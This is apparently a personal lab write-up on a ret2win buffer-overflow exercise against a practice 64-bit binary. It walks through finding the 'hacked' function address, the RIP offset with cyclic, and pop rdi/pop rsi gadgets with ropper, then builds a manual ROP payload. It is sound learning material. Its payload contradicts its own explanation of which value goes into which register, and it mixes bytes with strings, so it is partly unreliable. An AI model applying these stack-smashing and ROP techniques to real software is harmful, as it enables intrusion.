[[Binary Exploitation/03-04 Ret2Win/04 Functions parameters/x64/Source Code|Source Code]] 

### Basic File checks

1. File -> `./ret2win_params: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c9ab2d6786356596c407f942908f9078b156d4d1, for GNU/Linux 3.2.0, not stripped`
2. checksec ->
```python
[*] '/root/binary_exploitation/04/64/ret2win_params'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

### Manual Exploitation

We first need to find the hacked function address

```python
gdb-pwndbg ./ret2win_params
info functions
```

Result:

```python
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  puts@plt
0x0000000000401040  printf@plt
0x0000000000401050  __isoc99_scanf@plt
0x0000000000401060  _start
0x0000000000401090  _dl_relocate_static_pie
0x00000000004010a0  deregister_tm_clones
0x00000000004010d0  register_tm_clones
0x0000000000401110  __do_global_dtors_aux
0x0000000000401140  frame_dummy
0x0000000000401142  hacked
0x0000000000401190  register_name
0x00000000004011d7  main
0x00000000004011f0  __libc_csu_init
0x0000000000401250  __libc_csu_fini
0x0000000000401254  _fini
```

Now the function hacked address is `0x0000000000401142`

Next we need the RIP offset 

In 64 bit application there won't be a EIP and all the parameters will not be on the stack like previously

Now the RIP offset can be found like this

```python
cylcic 100
gdb-pwndbg ./ret2win_params
```

Result:

```python
*RAX  0x6f
*RBX  0x7fffffffde08 —▸ 0x7fffffffe1a4 ◂— '/root/binary_exploitation/04/64/ret2win_params'
 RCX  0x0
 RDX  0x0
*RDI  0x7fffffffd770 —▸ 0x7ffff7e1ae70 (funlockfile) ◂— mov rdi, qword ptr [rdi + 0x88]
*RSI  0x4052a0 ◂— 'Hi there, aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa\n'
*R8   0x4020a0 ◂— 0x6568742069480073 /* 's' */
*R9   0x73
 R10  0x0
*R11  0x202
 R12  0x0
*R13  0x7fffffffde18 —▸ 0x7fffffffe1d3 ◂— 0x5245545f5353454c ('LESS_TER')
 R14  0x0
*R15  0x7ffff7ffd020 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0x0
*RBP  0x6161616161616163 ('caaaaaaa')
*RSP  0x7fffffffdce8 ◂— 'daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
*RIP  0x4011d6 (register_name+70) ◂— ret
```

Now as you can see there is no cyclic pattern letters in the RIP that's because in 64 bit it checks if it is a valid address if not then it puts it into the RSP so in order to find the offset we need to do `cyclic -l daaaaaaa` Now we use the first 8 because it is 64 bit

Result:

```python
Finding cyclic pattern of 8 bytes: b'daaaaaaa' (hex: 0x6461616161616161)
Found at offset 24
```

Now in 64 bit the parameters aren't stored in the stack so you need to use rop objects

we can find this using a tool called Ropper

we need to replace the value in the `RSI` and the `RDI` parameters

So we need to find a `pop_rdi` and `pop_rsi` objects

we can do this using 

```python
ropper --file ./ret2win_params --search=pop
```

Result:

```python
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: ./ret2win_params
0x0000000000401244: pop r12; pop r13; pop r14; pop r15; ret;
0x0000000000401246: pop r13; pop r14; pop r15; ret;
0x0000000000401248: pop r14; pop r15; ret;
0x000000000040124a: pop r15; ret;
0x0000000000401243: pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
0x0000000000401247: pop rbp; pop r14; pop r15; ret;
0x0000000000401129: pop rbp; ret;
0x000000000040124b: pop rdi; ret;
0x0000000000401249: pop rsi; pop r15; ret;
0x0000000000401245: pop rsp; pop r13; pop r14; pop r15; ret;
```

Now we can make the manual exploit

```python
24 * b'A'  + '\x4b\x12\x40\x00\x00\x00\x00\x00' + '\xef\xbe\xad\xde\xef\xbe\xad\xde' + '\x49\x12\x40\x00\x00\x00\x00\x00' + '\xbe\xba\xde\xc0\xbe\xba\xde\xc0' + '\x00\x00\x00\x00\x00\x00\x00\x00'+ '\x42\x11\x40\x00\x00\x00\x00\x00'
```

`Padding to the EIP + pop_rdi address from ropper + 0xc0debabec0debabe in little Indian format + pop_rsi address from ropper + 0xdeadbeefdeadbeef + padding for the r15 + Hacked Function Address`

When we look at the thing for pop_rsi we see that it pop another thing as well
```python
0x0000000000401249: pop rsi; pop r15; ret;
```

Now let's put it into an automated script

[[Binary Exploitation/03-04 Ret2Win/04 Functions parameters/x64/Python Script|Python Script]] 